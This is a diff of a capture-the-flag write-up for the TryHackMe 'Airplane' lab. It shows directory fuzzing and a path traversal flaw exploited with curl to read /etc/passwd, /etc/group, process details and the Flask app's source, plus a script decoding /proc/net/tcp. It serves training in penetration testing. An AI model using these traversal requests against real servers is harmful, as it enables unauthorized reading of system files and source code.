@@ -47,9 +47,7 @@ When we go the the webpage on port 8000 we can see this webpage:
 
 ![Desktop View](/assets/img/2025-07-05-TryHackMe-Airplane/photo1.webp){: width="972" height="589" }
 
-
 Firstly lets fuzz the website using `gobuster`
-
 
 ```bash
 ❯ gobuster dir -w common.txt -u http://airplane.thm:8000/ -x md,js,html,php,py,css,txt,bak -t 30
@@ -78,7 +76,6 @@ Http server just serving index.html ok.
 
 When I looking throught site i found that there is page=index.html
 Maybe there is a path traversal vuln huh!
-
 
 ```bash
 ❯ curl 'http://airplane.thm:8000/?page=../../../../../etc/passwd'
@@ -136,10 +133,8 @@ sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
 
 Look what I got we can read files.
 
-
-
 ```bash
-❯ curl 'http://airplane.thm:8000/?page=../../../../../etc/group' 
+❯ curl 'http://airplane.thm:8000/?page=../../../../../etc/group'
 root:x:0:
 daemon:x:1:
 bin:x:2:
@@ -220,13 +215,11 @@ hudson:x:1001:
 
 There is carlos and hudson user also there is lxd we will probably face some container.
 
-
 Remember that this webserver is Werkzeug so it should be running some python application.
 So we need to find the where is the source code firstly:
 
-
 ```bash
-❯ curl 'http://airplane.thm:8000/?page=../../../../../proc/self/status'                    
+❯ curl 'http://airplane.thm:8000/?page=../../../../../proc/self/status'
 Name:	python3
 Umask:	0022
 State:	S (sleeping)
@@ -238,7 +231,7 @@ TracerPid:	0
 Uid:	1001	1001	1001	1001
 Gid:	1001	1001	1001	1001
 FDSize:	128
-Groups:	1001 
+Groups:	1001
 NStgid:	534
 NSpid:	534
 NSpgid:	534
@@ -283,22 +276,21 @@ Mems_allowed_list:	0
 voluntary_ctxt_switches:	173414
 nonvoluntary_ctxt_switches:	17905
 ```
+
 Which is running as 1001 (hudson) user.
 
 Now lets look at the cmdline.
 
-
 ```bash
 ❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/cmdline' | sed 's/\x00/ /g'
-/usr/bin/python3 app.py %                                                                  
+/usr/bin/python3 app.py %
 ```
 
 Yes I was right bro is runnig some python application.
 Now lets get the source code:
 
-
 ```bash
-❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/cwd/app.py'                
+❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/cwd/app.py'
 ```
 
 ```python
@@ -321,12 +313,12 @@ def index():
                 resp.headers["Content-Length"]=str(len(resp.get_data()))
 
             return resp
-        
+
         else:
             return "Page not found"
 
     else:
-        return redirect('http://airplane.thm:8000/?page=index.html', code=302)    
+        return redirect('http://airplane.thm:8000/?page=index.html', code=302)
 
 
 @app.route('/airplane')
@@ -335,9 +327,101 @@ def airplane():
 
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8000)%                               
+    app.run(host='0.0.0.0', port=8000)%
 ```
 
 Now we get the source code.
 
 Let's inspect the code first:
+
+There is nothing we can use. Just the path traversal vulnerable python code.
+
+Let's look at the tcp connections:
+
+```bash
+❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/net/tcp'
+  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
+   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 16163 1 0000000000000000 100 0 0 10 0
+   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 19114 1 0000000000000000 100 0 0 10 0
+   2: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18530 1 0000000000000000 100 0 0 10 0
+   3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21651 1 0000000000000000 100 0 0 10 0
+   4: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21091 1 0000000000000000 100 0 0 10 0
+   5: 924D0A0A:B5A2 54E5FD03:01BB 02 00000001:00000000 01:00000481 00000004     0        0 71191 2 0000000000000000 1600 0 0 1 7
+   6: 924D0A0A:1F40 80CE150A:D82E 01 00000000:00000000 00:00000000 00000000  1001        0 71193 1 0000000000000000 27 4 30 10 -1
+```
+
+3, 4 and 6 is running by 1001 (hudson). Lets look at the ports of this processes.
+
+But firstly we need to make the text readable. So I used AI to generate a script which makes this here is the script:
+
+```python
+import socket
+
+tcp_states = {
+    '01': 'ESTABLISHED',
+    '02': 'SYN_SENT',
+    '03': 'SYN_RECV',
+    '04': 'FIN_WAIT1',
+    '05': 'FIN_WAIT2',
+    '06': 'TIME_WAIT',
+    '07': 'CLOSE',
+    '08': 'CLOSE_WAIT',
+    '09': 'LAST_ACK',
+    '0A': 'LISTEN',
+    '0B': 'CLOSING',
+    '0C': 'NEW_SYN_RECV'
+}
+
+def hex_to_ip(hex_ip):
+    # 0100007F → 7F 00 00 01 → 127.0.0.1
+    ip_bytes = bytes.fromhex(hex_ip)
+    return socket.inet_ntoa(ip_bytes[::-1])
+
+def hex_to_port(hex_port):
+    return int(hex_port, 16)
+
+# Paste the data here
+raw_data = """
+   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 16163 1 0000000000000000 100 0 0 10 0
+   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 19114 1 0000000000000000 100 0 0 10 0
+   2: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18530 1 0000000000000000 100 0 0 10 0
+   3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21651 1 0000000000000000 100 0 0 10 0
+   4: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21091 1 0000000000000000 100 0 0 10 0
+   5: 924D0A0A:1F40 80CE150A:87E2 01 00000000:00000000 00:00000000 00000000  1001        0 71212 1 0000000000000000 27 4 28 10 -1
+"""
+
+lines = raw_data.strip().split('\n')[1:]
+
+for line in lines:
+    parts = line.split()
+    local_ip_hex, local_port_hex = parts[1].split(':')
+    remote_ip_hex, remote_port_hex = parts[2].split(':')
+    state_hex = parts[3]
+
+    local_ip = hex_to_ip(local_ip_hex)
+    local_port = hex_to_port(local_port_hex)
+    remote_ip = hex_to_ip(remote_ip_hex)
+    remote_port = hex_to_port(remote_port_hex)
+    state = tcp_states.get(state_hex, "UNKNOWN")
+
+    print(f"{local_ip}:{local_port} -> {remote_ip}:{remote_port} [{state}]")
+```
+
+```bash
+❯ python proc_net_tcp-to-normal.py
+0.0.0.0:22 -> 0.0.0.0:0 [LISTEN]
+127.0.0.1:631 -> 0.0.0.0:0 [LISTEN]
+0.0.0.0:8000 -> 0.0.0.0:0 [LISTEN]
+0.0.0.0:6048 -> 0.0.0.0:0 [LISTEN]
+10.10.77.146:8000 -> 10.21.206.128:34786 [ESTABLISHED]
+```
+
+The last process sending me some packages. Also there is 0.0.0.0:6648 port is open.
+Also we can see that with nmap scan.
+
+I play with this port a while but I didn't found anything.
+
+Maybe we can try to list processes using web server.
+
+Since we can't run `ps` in the target. We can try to read `/proc/${number}/cmdline` lets use a bash script for this.
+
